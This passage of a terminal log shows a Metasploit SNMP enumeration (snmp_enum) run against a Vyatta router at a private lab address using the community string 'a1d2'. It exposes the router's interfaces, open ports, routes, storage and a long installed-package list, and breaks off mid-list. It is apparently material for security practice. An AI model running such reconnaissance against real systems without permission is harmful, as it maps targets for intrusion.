  196608                unknown               running               GenuineIntel: Intel(R) Core(TM) i5-6360U CPU @ 2.00GHz
  262145                unknown               running               network interface lo
  262146                unknown               running               network interface eth0
  786432                unknown               unknown               Guessing that there's a floating point co-processor

[*] Software components:

  Index                 Name
  0                     acpi-support-base-0.137-5
  1                     acpid-1:2.0.7-1squeeze4
  2                     adduser-3.112+nmu2
  3                     apt-0.8.10.3+squeeze1
  4                     apt-transport-https-0.8.10.3+squeeze1
  5                     apt-utils-0.8.10.3+squeeze1
  6                     aptitude-0.6.3-3.2+squeeze1
  7                     at-3.1.12-1+squeeze1
  8                     atmel-firmware-1.3-4
  9                     base-files-6.0squeeze7
  10                    base-passwd-3.5.22
  11                    bash-4.1-3
  12                    bash-completion-1:1.3-1
  13                    bcrelay-1.3.4-3
  14                    bind9-host-1:9.7.3.dfsg-1~squeeze9
  15                    bmon-2.0.1-3
  16                    bridge-utils-1.4-5
  17                    bsdmainutils-8.0.13
  18                    bsdutils-1:2.17.2-9
  19                    ca-certificates-20090814+nmu3squeeze1
  20                    cluster-agents-1:1.0.3-3.1
  21                    cluster-glue-1.0.6-1
  22                    conntrack-1:1.0.1-2+vyatta35+daisy4
  23                    conntrack-helpers-1:1.0.1-2+vyatta35+daisy4
  24                    conntrackd-1:1.0.1-2+vyatta35+daisy4
  25                    console-common-0.7.85
  26                    console-data-2:1.10-9
  27                    console-setup-1.68+squeeze2
  28                    console-terminus-4.30-2
  29                    coreutils-8.5-1
  30                    cpio-2.11-4
  31                    cpufrequtils-007-2
  32                    cron-3.0pl1-116
  33                    curl-7.21.0-2.1+squeeze2
  34                    dash-0.5.5.1-7.4
  35                    ddclient-3.8.0-11.3
  36                    debconf-1.5.36.1
  37                    debconf-i18n-1.5.36.1
  38                    debian-archive-keyring-2010.08.28+squeeze1
  39                    debianutils-3.4
  40                    dialog-1.1-20100428-1
  41                    diffutils-1:3.0-1
  42                    dmidecode-2.9-1.2
  43                    dmsetup-2:1.02.48-5
  44                    dnsmasq-2.55-2
  45                    dnsmasq-base-2.55-2+b1
  46                    dpkg-1.15.8.13
  47                    e2fslibs-1.41.12-4stable1
  48                    e2fsprogs-1.41.12-4stable1
  49                    ed-1.4-3
  50                    eject-2.1.5+deb1+cvs20081104-7.1
  51                    ethtool-1:2.6.34-3
  52                    expect-5.44.1.15-4
  53                    file-5.04-5+squeeze2
  54                    findutils-4.4.2-1+b1
  55                    gawk-1:3.1.7.dfsg-5
  56                    gcc-4.4-base-4.4.5-8
  57                    gettext-base-0.18.1.1-3
  58                    gnupg-1.4.10-4+squeeze1
  59                    gpgv-1.4.10-4+squeeze1
  60                    grep-2.6.3-3
  61                    groff-base-1.20.1-10
  62                    grub-common-1.98+20100804-14-vyatta6+daisy1
  63                    grub-pc-1.98+20100804-14-vyatta6+daisy1
  64                    gzip-1.3.12-9+squeeze1
  65                    heartbeat-1:3.0.3-2
  66                    host-1:9.7.3.dfsg-1~squeeze9
  67                    hostapd-1:0.6.10-2+squeeze1
  68                    hostname-3.04
  69                    iftop-0.17-16
  70                    ifupdown-0.6.10
  71                    initramfs-tools-0.98.2+vyatta+7+daisy2
  72                    initscripts-2.88dsf-13.1+squeeze1
  73                    insserv-1.14.0-2
  74                    installation-report-2.44
  75                    iperf-2.0.4-5
  76                    iproute-20120801-vyatta+2+daisy1
  77                    ipsec-tools-1:0.7.3-12
  78                    ipset-6.9-1+vyatta5+daisy2
  79                    iptables-1.4.10+vyatta+6+daisy1
  80                    iptraf-3.0.0-7
  81                    iputils-arping-3:20100418-3
  82                    iputils-ping-3:20100418-3
  83                    ipvsadm-1:1.25.clean-1
  84                    iw-0.9.19-1
  85                    jnettop-0.12.0-4
  86                    kbd-1.15.2-2
  87                    keyboard-configuration-1.68+squeeze2
  88                    klibc-utils-1.5.20-1+squeeze1
  89                    laptop-detect-0.13.7
  90                    less-436-1
  91                    libacl1-2.2.49-4
  92                    libattr1-1:2.4.44-2
  93                    libbind9-60-1:9.7.3.dfsg-1~squeeze9
  94                    libblkid1-2.17.2-9
  95                    libboost-filesystem1.42.0-1.42.0-4
  96                    libboost-iostreams1.42.0-1.42.0-4
  97                    libboost-system1.42.0-1.42.0-4
  98                    libbsd0-0.2.0-1
  99                    libbz2-1.0-1.0.5-6+squeeze1
  100                   libc-ares2-1.7.3-1squeeze1
  101                   libc-bin-2.11.3-4
  102                   libc6-2.11.3-4
  103                   libcap2-1:2.19-3+vyatta4+daisy1
  104                   libcap2-bin-1:2.19-3+vyatta4+daisy1
  105                   libcluster-glue-1.0.6-1
  106                   libcomerr2-1.41.12-4stable1
  107                   libcpufreq0-007-1+squeeze1
  108                   libcurl3-7.21.0-2.1+squeeze2
  109                   libcurl3-gnutls-7.21.0-2.1+squeeze2
  110                   libcwidget3-0.5.16-3
  111                   libdb4.7-4.7.25-9
  112                   libdb4.8-4.8.30-2
  113                   libdbus-1-3-1.2.24-4+squeeze2
  114                   libdevmapper1.02.1-2:1.02.48-5
  115                   libdns69-1:9.7.3.dfsg-1~squeeze9
  116                   libedit2-2.11-20080614-2
  117                   libept1-1.0.4
  118                   libexpat1-2.0.1-7+squeeze1
  119                   libfam0-2.7.0-17
  120                   libfile-sync-perl-0.09-4+b1
  121                   libfreetype6-2.4.2-2.1+squeeze4
  122                   libgcc1-1:4.4.5-8
  123                   libgcrypt11-1.4.5-2
  124                   libgdbm3-1.8.3-9
  125                   libgeoip1-1.4.7~beta6+dfsg-1
  126                   libglib2.0-0-2.24.2-1
  127                   libgmp3c2-2:4.3.2+dfsg-1
  128                   libgnutls26-2.8.6-1+squeeze2
  129                   libgpg-error0-1.6-1
  130                   libgssapi-krb5-2-1.8.3+dfsg-4squeeze6
  131                   libheartbeat2-1:3.0.3-2
  132                   libhtml-parser-perl-3.66-1
  133                   libhtml-tagset-perl-3.20-2
  134                   libhtml-tree-perl-3.23-2
  135                   libidn11-1.15-2
  136                   libio-prompt-perl-0.997001-1
  137                   libio-socket-ssl-perl-1.33-1+squeeze1
  138                   libisc62-1:9.7.3.dfsg-1~squeeze9
  139                   libisccc60-1:9.7.3.dfsg-1~squeeze9
  140                   libisccfg62-1:9.7.3.dfsg-1~squeeze9
  141                   libk5crypto3-1.8.3+dfsg-4squeeze6
  142                   libkeyutils1-1.4-1
  143                   libklibc-1.5.20-1+squeeze1
  144                   libkrb5-3-1.8.3+dfsg-4squeeze6
  145                   libkrb5support0-1.8.3+dfsg-4squeeze6
  146                   libldap-2.4-2-2.4.23-7.3
  147                   liblocale-gettext-perl-1.05-6
  148                   libltdl7-2.2.6b-2
  149                   liblua5.1-0-5.1.4-5
  150                   liblwres60-1:9.7.3.dfsg-1~squeeze9
  151                   liblzma2-5.0.0-2
  152                   liblzo2-2-2.03-2
  153                   libmagic1-5.04-5+squeeze2
  154                   libmnl0-1.0.3-5+daisy1
  155                   libncurses5-5.7+20100313-5
  156                   libncursesw5-5.7+20100313-5
  157                   libnet-ssleay-perl-1.36-1
  158                   libnet1-1.1.4-2
  159                   libnetaddr-ip-perl-4.028+dfsg-1
  160                   libnetfilter-conntrack3-1.0.0-1+vyatta16+daisy2
  161                   libnetfilter-cthelper-1.0.1-4+daisy1
  162                   libnetfilter-cttimeout-1.0.0-3+daisy1
  163                   libnetfilter-queue1-0.0.17-6+daisy1
  164                   libnfnetlink0-1.0.0-1
  165                   libnl1-1.1-6
  166                   libopenhpi2-2.14.1-1
  167                   libopenipmi0-2.0.16-1.2
  168                   libopts25-1:5.10-1.1
  169                   libpam-modules-1.1.1-6.1+squeeze1
  170                   libpam-radius-auth-1.3.16-4.4
  171                   libpam-runtime-1.1.1-6.1+squeeze1
  172                   libpam0g-1.1.1-6.1+squeeze1
  173                   libparted0debian1-2.3-5
  174                   libpcap0.8-1.1.1-2+squeeze1
  175                   libpci3-1:3.1.7-6
  176                   libpcre3-8.02-1.1
  177                   libpcsclite1-1.5.5-4
  178                   libperl5.10-5.10.1-17squeeze6
  179                   libpkcs11-helper1-1.07-1
  180                   libpopt0-1.16-1
  181                   libradiusclient-ng2-0.5.6-1.1
  182                   libreadline6-6.1-3
  183                   libsablot0-1.0.3-1.1
  184                   libsasl2-2-2.1.23.dfsg1-7
  185                   libselinux1-2.0.96-1
  186                   libsensors4-1:3.1.2-6
  187                   libsepol1-2.0.41-1
  188                   libsigc++-2.0-0c2a-2.2.4.2-1
  189                   libslang2-2.2.2-4
  190                   libsmi2ldbl-0.4.8+dfsg2-3
  191                   libsnmp-base-5.7.2-vyatta+1+daisy3
  192                   libsnmp-perl-5.7.2-vyatta+1+daisy3
  193                   libsnmp15-5.7.2-vyatta+1+daisy3
  194                   libsocket6-perl-0.23-1
  195                   libsort-versions-perl-1.5-4
  196                   libsqlite3-0-3.7.3-1
  197                   libss2-1.41.12-4stable1
  198                   libssh2-1-1.2.6-1
  199                   libssl0.9.8-0.9.8o-4squeeze14
  200                   libstdc++6-4.4.5-8
  201                   libstrongswan-4.5.2-1.1-bpo60+5+daisy2
  202                   libsysfs2-2.1.0+repack-1
  203                   libtasn1-3-2.7-1+squeeze+1
  204                   libterm-readkey-perl-2.30-4
  205                   libterm-readline-perl-perl-1.0303-1
  206                   libtext-charwidth-perl-0.04-6
  207                   libtext-iconv-perl-1.7-2
  208                   libtext-wrapi18n-perl-0.06-7
  209                   libtimedate-perl-1.2000-1
  210                   libtree-simple-perl-1.18-1
  211                   libudev0-164-3
  212                   liburi-perl-1.54-2
  213                   libusb-0.1-4-2:0.1.12-16
  214                   libuuid1-2.17.2-9
  215                   libvyatta-cfg1-0.101.7+daisy2
  216                   libvyatta-util1-0.13+daisy1
  217                   libwant-perl-0.18-2
  218                   libwrap0-7.6.q-19
  219                   libwww-perl-5.836-1
  220                   libxapian22-1.2.3-2
  221                   libxml-libxml-perl-1.70.ds-1
  222                   libxml-namespacesupport-perl-1.09-3
  223                   libxml-sax-perl-0.96+dfsg-2
  224                   libxml-simple-perl-2.18-3
  225                   libxml2-2.7.8.dfsg-2+squeeze6
  226                   libxml2-utils-2.7.8.dfsg-2+squeeze6
  227                   lighttpd-1.4.28-2+squeeze1.3
  228                   linux-firmware-1.29+daisy1
  229                   linux-image-3.3.8-1-586-vyatta-3.3.8-1+vyatta+14+daisy4
  230                   live-initramfs-1.157.1-1+vyatta+20+daisy1
  231                   lldpd-0.6.0+vyatta+3+daisy2
  232                   locales-2.11.3-4
  233                   login-1:4.1.4.2+svn3283-2+squeeze1
  234                   logrotate-3.7.8-6
  235                   lsb-base-3.2-23.2squeeze1
  236                   lsof-4.81.dfsg.1-1
  237                   man-db-2.5.7-8
  238                   mawk-1.3.3-15
  239                   mdadm-3.1.4-1+8efb9d1+squeeze1
  240                   mgetty-1.1.36-1.6
  241                   mime-support-3.48-1
  242                   module-init-tools-3.12-2+b1
  243                   mount-2.17.2-9
  244                   mtr-tiny-0.75-2
  245                   nano-2.2.4-1
  246                   ncurses-base-5.7+20100313-5
  247                   ncurses-bin-5.7+20100313-5
  248                   net-tools-1.60-23
  249                   netbase-4.45
  250                   netcat-traditional-1.10-38
  251                   netplug-1.2.9.1-2-vyatta+3+daisy1
  252                   nfct-1:1.0.1-2+vyatta35+daisy4
  253                   ntp-1:4.2.6.p2+dfsg-1+vyatta+6+daisy2
  254                   ntpdate-1:4.2.6.p2+dfsg-1+vyatta+6+daisy2
  255                   openssh-blacklist-0.4.1
  256                   openssh-client-1:5.5p1-6+squeeze3
  257                   openssh-server-1:5.5p1-6+squeeze3
  258                   openssl-0.9.8o-4squeeze14
  259                   openssl-blacklist-0.5-2
  260                   openvpn-2.1.3-2+squeeze1
  261                   openvpn-blacklist-0.4
  262                   parted-2.3-5
  263                   passwd-1:4.1.4.2+svn3283-2+squeeze1
  264                   patch-2.6-2
  265                   pciutils-1:3.1.7-6
  266                   perl-5.10.1-17squeeze6
  267                   perl-base-5.10.1-17squeeze6
  268                   perl-modules-5.10.1-17squeeze6
  269                   pmacct-0.14.0+vyatta+1+daisy1
  270                   ppp-2.4.5-4
  271                   pppoe-3.8-3
  272                   pptpd-1.3.4-3
  273                   procps-1:3.2.8-9squeeze1
  274                   psmisc-22.11-1
  275                   python-2.6.6-3+squeeze7
  276                   python-central-0.6.16+nmu1
  277                   python-minimal-2.6.6-3+squeeze7
  278                   python2.6-2.6.6-8+b1
  279                   python2.6-minimal-2.6.6-8+b1
  280                   radvd-1:1.6-1.1
  281                   readline-common-6.1-3
  282                   rsync-3.0.7-2
  283                   rsyslog-4.6.4-2
  284                   screen-4.0.3-14
  285                   sed-4.2.1-7
  286                   sensible-utils-0.0.4
  287                   sipcalc-1.1.4-2
  288                   snmp-5.7.2-vyatta+1+daisy3
  289                   snmpd-5.7.2-vyatta+1+daisy3
  290                   squid-langpack-20100628-1
  291                   squid3-3.1.6-1.2+squeeze3
  292                   squid3-common-3.1.6-1.2+squeeze3
  293                   squidclient-3.1.6-1.2+squeeze3
  294                   squidguard-1.4.0+vyatta+20+daisy1
  295                   ssh-1:5.5p1-6+squeeze3
  296                   ssmtp-2.64-4
  297                   strongswan-4.5.2-1.1-bpo60+5+daisy2
  298                   strongswan-ikev1-4.5.2-1.1-bpo60+5+daisy2
  299                   strongswan-ikev2-4.5.2-1.1-bpo60+5+daisy2
  300                   strongswan-starter-4.5.2-1.1-bpo60+5+daisy2
  301                   sudo-1.7.4p4-2.squeeze.4
  302                   sysv-rc-2.88dsf-13.1+squeeze1
  303                   sysvinit-2.88dsf-13.1+squeeze1
  304                   sysvinit-utils-2.88dsf-13.1+squeeze1
  305                   tar-1.23-3
  306                   tasksel-2.88
  307                   tasksel-data-2.88
  308                   tcl8.5-8.5.8-2
  309                   tcpdump-4.1.1-1
  310                   traceroute-1:2.0.15-1
  311                   tshark-1.2.11-6+squeeze10
  312                   tzdata-2012g-0squeeze1
  313                   ucf-3.0025+nmu1
  314                   udev-164-3
  315                   usbutils-0.87-5squeeze1
  316                   user-setup-1.38
  317                   util-linux-2.17.2-9
  318                   vim-common-2:7.2.445+hg~cb94c42c0e1a-1
  319                   vim-tiny-2:7.2.445+hg~cb94c42c0e1a-1
  320                   vlan-1.9-3
  321                   vyatta-base-0.58+daisy1
  322                   vyatta-bash-4.1-3-vyatta11+daisy1
  323                   vyatta-biosdevname-1:0.3.11-vyatta6+daisy1
  324                   vyatta-busybox-1.19.0-1+vyatta+6+daisy1
  325                   vyatta-cfg-0.101.7+daisy2
  326                   vyatta-cfg-dhcp-relay-0.10.24+daisy1
  327                   vyatta-cfg-dhcp-server-0.12.36+daisy2
  328                   vyatta-cfg-firewall-0.13.91+daisy6
  329                   vyatta-cfg-op-pppoe-0.11.20+daisy2
  330                   vyatta-cfg-qos-0.15.42+daisy1
  331                   vyatta-cfg-quagga-0.18.161+daisy6
  332                   vyatta-cfg-system-0.20.42+daisy18
  333                   vyatta-cfg-vpn-0.12.105+daisy6
  334                   vyatta-cluster-0.11.25+daisy1
  335                   vyatta-config-mgmt-0.34+daisy1
  336                   vyatta-config-migrate-0.13.65+daisy1
  337                   vyatta-conntrack-0.54+daisy2
  338                   vyatta-conntrack-sync-0.46+daisy2
  339                   vyatta-dhcp3-client-4.1.2+vyatta9+daisy1
  340                   vyatta-dhcp3-common-4.1.2+vyatta9+daisy1
  341                   vyatta-dhcp3-relay-4.1.2+vyatta9+daisy1
  342                   vyatta-dhcp3-server-4.1.2+vyatta9+daisy1
  343                   vyatta-ipv6-rtradv-0.38+daisy1
  344                   vyatta-keepalived-1.2.2-1-vyatta-13+daisy2
  345                   vyatta-lldp-0.25+daisy2
  346                   vyatta-nat-0.12.40+daisy2
  347                   vyatta-netflow-0.42+daisy1
  348                   vyatta-op-0.13.275+daisy5
  349                   vyatta-op-dhcp-server-0.13.24+daisy1
  350                   vyatta-op-firewall-0.10.4-39+daisy3
  351                   vyatta-op-qos-0.12.27+daisy1
  352                   vyatta-op-quagga-0.11.34+daisy1
  353                   vyatta-op-vpn-0.13.83+daisy6
  354                   vyatta-op-xml-0.11.10+daisy1
  355                   vyatta-openvpn-0.2.60+daisy6
  356                   vyatta-ppp-2.4.4rel-8-vyatta-27+pacifica3+daisy1
  357                   vyatta-quagga-0.99.20.1-13+daisy2
  358                   vyatta-ravpn-0.12.44+daisy1
  359                   vyatta-util-0.13+daisy1
  360                   vyatta-version-VC6.6R1
  361                   vyatta-vrrp-0.11+daisy2
  362                   vyatta-wanloadbalance-0.13.67+daisy1
  363                   vyatta-webgui-0.2.13-101+daisy2
  364                   vyatta-webproxy-0.2.110+daisy1
  365                   vyatta-wireless-0.3.41+daisy2
  366                   vyatta-wirelessmodem-0.1.24+daisy1
  367                   vyatta-zone-0.15+daisy1
  368                   whois-5.0.10
  369                   wireshark-common-1.2.11-6+squeeze10
  370                   wpasupplicant-0.6.10-2.1
  371                   xkb-data-1.8-2
  372                   xl2tpd-1.2.7+dfsg-1
  373                   xz-utils-5.0.0-2
  374                   zlib1g-1:1.2.3.4.dfsg-3

Using MSF
msf > use auxiliary/scanner/snmp/
use auxiliary/scanner/snmp/aix_version                 use auxiliary/scanner/snmp/netopia_enum                use auxiliary/scanner/snmp/snmp_enumusers
use auxiliary/scanner/snmp/arris_dg950                 use auxiliary/scanner/snmp/sbg6580_enum                use auxiliary/scanner/snmp/snmp_login
use auxiliary/scanner/snmp/brocade_enumhash            use auxiliary/scanner/snmp/snmp_enum                   use auxiliary/scanner/snmp/snmp_set
use auxiliary/scanner/snmp/cisco_config_tftp           use auxiliary/scanner/snmp/snmp_enum_hp_laserjet       use auxiliary/scanner/snmp/ubee_ddw3611
use auxiliary/scanner/snmp/cisco_upload_file           use auxiliary/scanner/snmp/snmp_enumshares             use auxiliary/scanner/snmp/xerox_workcentre_enumusers
msf > use auxiliary/scanner/snmp/snmp_enum
msf auxiliary(snmp_enum) > show options

Module options (auxiliary/scanner/snmp/snmp_enum):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   COMMUNITY  public           yes       SNMP Community String
   RETRIES    1                yes       SNMP Retries
   RHOSTS                      yes       The target address range or CIDR identifier
   RPORT      161              yes       The target port
   THREADS    1                yes       The number of concurrent threads
   TIMEOUT    1                yes       SNMP Timeout
   VERSION    1                yes       SNMP Version <1/2c>

msf auxiliary(snmp_enum) > set COMMUNITY a1d2
COMMUNITY => a1d2
msf auxiliary(snmp_enum) > set RHOSTS 192.168.1.101
RHOSTS => 192.168.1.101
msf auxiliary(snmp_enum) > run

[+] 192.168.1.101, Connected.

[*] System information:

Host IP                       : 192.168.1.101
Hostname                      : vyatta
Description                   : Vyatta VC6.6R1
Contact                       : root
Location                      : Unknown
Uptime snmp                   : 03:53:50.68
Uptime system                 : 00:52:39.12
System date                   : 2017-2-28 11:30:18.0

[*] Network information:

IP forwarding enabled         : yes
Default TTL                   : 64
TCP segments received         : 9800
TCP segments sent             : 9391
TCP segments retrans          : 0
Input datagrams               : 15494
Delivered datagrams           : 15446
Output datagrams              : 9130

[*] Network interfaces:

Interface                     : [ up ] lo
Id                            : 1
Mac Address                   : :::::
Type                          : softwareLoopback
Speed                         : 10 Mbps
MTU                           : 16436
In octets                     : 363743
Out octets                    : 363743

Interface                     : [ up ] Advanced Micro Devices [AMD] 79c970 [PCnet32 LANCE]
Id                            : 2
Mac Address                   : 00:0c:29:77:a7:10
Type                          : ethernet-csmacd
Speed                         : 0 Mbps
MTU                           : 1500
In octets                     : 1897783
Out octets                    : 817199


[*] Network IP:

Id                  IP Address          Netmask             Broadcast
1                   127.0.0.1           255.0.0.0           0
2                   192.168.1.101       255.255.255.0       1

[*] Routing information:

Destination         Next hop            Mask                Metric
127.0.0.0           0.0.0.0             255.0.0.0           0
192.168.1.0         0.0.0.0             255.255.255.0       0

[*] TCP connections and listening ports:

Local address       Local port          Remote address      Remote port         State
0.0.0.0             22                  0.0.0.0             0                   listen
0.0.0.0             80                  0.0.0.0             0                   listen
0.0.0.0             443                 0.0.0.0             0                   listen
127.0.0.1           199                 0.0.0.0             0                   listen
127.0.0.1           199                 127.0.0.1           43501               established
127.0.0.1           199                 127.0.0.1           43502               established
127.0.0.1           199                 127.0.0.1           43503               established
127.0.0.1           43501               127.0.0.1           199                 established
127.0.0.1           43502               127.0.0.1           199                 established
127.0.0.1           43503               127.0.0.1           199                 established
192.168.1.101       22                  192.168.1.10        50631               established

[*] Listening UDP ports:

Local address       Local port
0.0.0.0             123
0.0.0.0             161
127.0.0.1           123
192.168.1.101       123

[*] Storage information:

Description                   : ["Physical memory"]
Device id                     : [#<SNMP::Integer:0xdb339d8 @value=1>]
Filesystem type               : ["Ram"]
Device unit                   : [#<SNMP::Integer:0xdb3155c @value=1024>]
Memory size                   : 247.20 MB
Memory used                   : 149.90 MB

Description                   : ["Virtual memory"]
Device id                     : [#<SNMP::Integer:0xdb2b080 @value=3>]
Filesystem type               : ["Virtual Memory"]
Device unit                   : [#<SNMP::Integer:0xdb2895c @value=1024>]
Memory size                   : 247.20 MB
Memory used                   : 149.90 MB

Description                   : ["Memory buffers"]
Device id                     : [#<SNMP::Integer:0xdb22750 @value=6>]
Filesystem type               : ["Other"]
Device unit                   : [#<SNMP::Integer:0xdb1fb2c @value=1024>]
Memory size                   : 247.20 MB
Memory used                   : 23.34 MB

Description                   : ["Cached memory"]
Device id                     : [#<SNMP::Integer:0xdb19b78 @value=7>]
Filesystem type               : ["Other"]
Device unit                   : [#<SNMP::Integer:0xdb16fa4 @value=1024>]
Memory size                   : 80.62 MB
Memory used                   : 80.62 MB

Description                   : ["Shared memory"]
Device id                     : [#<SNMP::Integer:0xdb0fc7c @value=8>]
Filesystem type               : ["Other"]
Device unit                   : [#<SNMP::Integer:0xdb0decc @value=1024>]
Memory size                   : 440.00 KB
Memory used                   : 440.00 KB

Description                   : ["Swap space"]
Device id                     : [#<SNMP::Integer:0xdb08148 @value=10>]
Filesystem type               : ["Virtual Memory"]
Device unit                   : [#<SNMP::Integer:0xdb06500 @value=1024>]
Memory size                   : 0 bytes
Memory used                   : 0 bytes

Description                   : ["/lib/init/rw"]
Device id                     : [#<SNMP::Integer:0xdb01744 @value=32>]
Filesystem type               : ["Fixed Disk"]
Device unit                   : [#<SNMP::Integer:0xdafe6d4 @value=4096>]
Memory size                   : 123.60 MB
Memory used                   : 0 bytes

Description                   : ["/dev"]
Device id                     : [#<SNMP::Integer:0xdaf9bc0 @value=35>]
Filesystem type               : ["Fixed Disk"]
Device unit                   : [#<SNMP::Integer:0xdaf7988 @value=4096>]
Memory size                   : 116.40 MB
Memory used                   : 180.00 KB

Description                   : ["/dev/shm"]
Device id                     : [#<SNMP::Integer:0xdaf0bec @value=36>]
Filesystem type               : ["Fixed Disk"]
Device unit                   : [#<SNMP::Integer:0xdaeebbc @value=4096>]
Memory size                   : 123.60 MB
Memory used                   : 4.00 KB

Description                   : ["/live/image"]
Device id                     : [#<SNMP::Integer:0xdae5990 @value=38>]
Filesystem type               : ["Fixed Disk"]
Device unit                   : [#<SNMP::Integer:0xdae06fc @value=4096>]
Memory size                   : 7.97 GB
Memory used                   : 466.80 MB

Description                   : ["/live/cow"]
Device id                     : [#<SNMP::Integer:0xdadba80 @value=39>]
Filesystem type               : ["Fixed Disk"]
Device unit                   : [#<SNMP::Integer:0xdad83e4 @value=4096>]
Memory size                   : 7.97 GB
Memory used                   : 466.80 MB

Description                   : ["/live"]
Device id                     : [#<SNMP::Integer:0xdad15a8 @value=40>]
Filesystem type               : ["Fixed Disk"]
Device unit                   : [#<SNMP::Integer:0xdacd0ac @value=4096>]
Memory size                   : 123.60 MB
Memory used                   : 0 bytes

Description                   : ["/tmp"]
Device id                     : [#<SNMP::Integer:0xdac5ca8 @value=41>]
Filesystem type               : ["Fixed Disk"]
Device unit                   : [#<SNMP::Integer:0xdac38f4 @value=4096>]
Memory size                   : 123.60 MB
Memory used                   : 4.00 KB

Description                   : ["/opt/vyatta/etc/config"]
Device id                     : [#<SNMP::Integer:0xdabe46c @value=42>]
Filesystem type               : ["Fixed Disk"]
Device unit                   : [#<SNMP::Integer:0xdaba8e4 @value=4096>]
Memory size                   : 7.97 GB
Memory used                   : 466.80 MB

Description                   : ["/var/run"]
Device id                     : [#<SNMP::Integer:0xdab24a0 @value=43>]
Filesystem type               : ["Fixed Disk"]
Device unit                   : [#<SNMP::Integer:0xdab072c @value=4096>]
Memory size                   : 123.60 MB
Memory used                   : 76.00 KB

Description                   : ["/opt/vyatta/config"]
Device id                     : [#<SNMP::Integer:0xdaaacc8 @value=44>]
Filesystem type               : ["Fixed Disk"]
Device unit                   : [#<SNMP::Integer:0xdaa9044 @value=4096>]
Memory size                   : 123.60 MB
Memory used                   : 172.00 KB


[*] Device information:

Id                  Type                Status              Descr
196608              Processor           running             GenuineIntel: Intel(R) Core(TM) i5-6360U CPU @ 2.00GHz
262145              Network             running             network interface lo
262146              Network             running             network interface eth0
786432              Coprocessor         unknown             Guessing that there's a floating point co-processor

[*] Software components:

Index               Name
0                   acpi-support-base-0.137-5
1                   acpid-1:2.0.7-1squeeze4
2                   adduser-3.112+nmu2
3                   apt-0.8.10.3+squeeze1
4                   apt-transport-https-0.8.10.3+squeeze1
5                   apt-utils-0.8.10.3+squeeze1
6                   aptitude-0.6.3-3.2+squeeze1
7                   at-3.1.12-1+squeeze1
8                   atmel-firmware-1.3-4
9                   base-files-6.0squeeze7
10                  base-passwd-3.5.22
11                  bash-4.1-3
12                  bash-completion-1:1.3-1
13                  bcrelay-1.3.4-3
14                  bind9-host-1:9.7.3.dfsg-1~squeeze9
15                  bmon-2.0.1-3
16                  bridge-utils-1.4-5
17                  bsdmainutils-8.0.13
18                  bsdutils-1:2.17.2-9
19                  ca-certificates-20090814+nmu3squeeze1
20                  cluster-agents-1:1.0.3-3.1
21                  cluster-glue-1.0.6-1
22                  conntrack-1:1.0.1-2+vyatta35+daisy4
23                  conntrack-helpers-1:1.0.1-2+vyatta35+daisy4
24                  conntrackd-1:1.0.1-2+vyatta35+daisy4
25                  console-common-0.7.85
26                  console-data-2:1.10-9
27                  console-setup-1.68+squeeze2
28                  console-terminus-4.30-2
29                  coreutils-8.5-1
30                  cpio-2.11-4
31                  cpufrequtils-007-2
32                  cron-3.0pl1-116
33                  curl-7.21.0-2.1+squeeze2
34                  dash-0.5.5.1-7.4
35                  ddclient-3.8.0-11.3
36                  debconf-1.5.36.1
37                  debconf-i18n-1.5.36.1
38                  debian-archive-keyring-2010.08.28+squeeze1
39                  debianutils-3.4
40                  dialog-1.1-20100428-1
41                  diffutils-1:3.0-1
42                  dmidecode-2.9-1.2
43                  dmsetup-2:1.02.48-5
44                  dnsmasq-2.55-2
45                  dnsmasq-base-2.55-2+b1
46                  dpkg-1.15.8.13
47                  e2fslibs-1.41.12-4stable1
48                  e2fsprogs-1.41.12-4stable1
49                  ed-1.4-3
50                  eject-2.1.5+deb1+cvs20081104-7.1
51                  ethtool-1:2.6.34-3
52                  expect-5.44.1.15-4
53                  file-5.04-5+squeeze2
54                  findutils-4.4.2-1+b1
55                  gawk-1:3.1.7.dfsg-5
56                  gcc-4.4-base-4.4.5-8
57                  gettext-base-0.18.1.1-3
58                  gnupg-1.4.10-4+squeeze1
59                  gpgv-1.4.10-4+squeeze1
60                  grep-2.6.3-3
61                  groff-base-1.20.1-10
62                  grub-common-1.98+20100804-14-vyatta6+daisy1
63                  grub-pc-1.98+20100804-14-vyatta6+daisy1
64                  gzip-1.3.12-9+squeeze1
65                  heartbeat-1:3.0.3-2
66                  host-1:9.7.3.dfsg-1~squeeze9
67                  hostapd-1:0.6.10-2+squeeze1
68                  hostname-3.04
69                  iftop-0.17-16
70                  ifupdown-0.6.10
71                  initramfs-tools-0.98.2+vyatta+7+daisy2
72                  initscripts-2.88dsf-13.1+squeeze1
73                  insserv-1.14.0-2
74                  installation-report-2.44
75                  iperf-2.0.4-5
76                  iproute-20120801-vyatta+2+daisy1
77                  ipsec-tools-1:0.7.3-12
78                  ipset-6.9-1+vyatta5+daisy2
79                  iptables-1.4.10+vyatta+6+daisy1
80                  iptraf-3.0.0-7
81                  iputils-arping-3:20100418-3
82                  iputils-ping-3:20100418-3
83                  ipvsadm-1:1.25.clean-1
84                  iw-0.9.19-1
85                  jnettop-0.12.0-4
86                  kbd-1.15.2-2
87                  keyboard-configuration-1.68+squeeze2
88                  klibc-utils-1.5.20-1+squeeze1
89                  laptop-detect-0.13.7
90                  less-436-1
91                  libacl1-2.2.49-4
92                  libattr1-1:2.4.44-2
93                  libbind9-60-1:9.7.3.dfsg-1~squeeze9
94                  libblkid1-2.17.2-9
95                  libboost-filesystem1.42.0-1.42.0-4
96                  libboost-iostreams1.42.0-1.42.0-4
97                  libboost-system1.42.0-1.42.0-4
98                  libbsd0-0.2.0-1
99                  libbz2-1.0-1.0.5-6+squeeze1
100                 libc-ares2-1.7.3-1squeeze1
101                 libc-bin-2.11.3-4
102                 libc6-2.11.3-4
103                 libcap2-1:2.19-3+vyatta4+daisy1
104                 libcap2-bin-1:2.19-3+vyatta4+daisy1
105                 libcluster-glue-1.0.6-1
106                 libcomerr2-1.41.12-4stable1
107                 libcpufreq0-007-1+squeeze1
108                 libcurl3-7.21.0-2.1+squeeze2
109                 libcurl3-gnutls-7.21.0-2.1+squeeze2
110                 libcwidget3-0.5.16-3
111                 libdb4.7-4.7.25-9
112                 libdb4.8-4.8.30-2
113                 libdbus-1-3-1.2.24-4+squeeze2
114                 libdevmapper1.02.1-2:1.02.48-5
115                 libdns69-1:9.7.3.dfsg-1~squeeze9
116                 libedit2-2.11-20080614-2
117                 libept1-1.0.4
118                 libexpat1-2.0.1-7+squeeze1
119                 libfam0-2.7.0-17
120                 libfile-sync-perl-0.09-4+b1
121                 libfreetype6-2.4.2-2.1+squeeze4
122                 libgcc1-1:4.4.5-8
123                 libgcrypt11-1.4.5-2
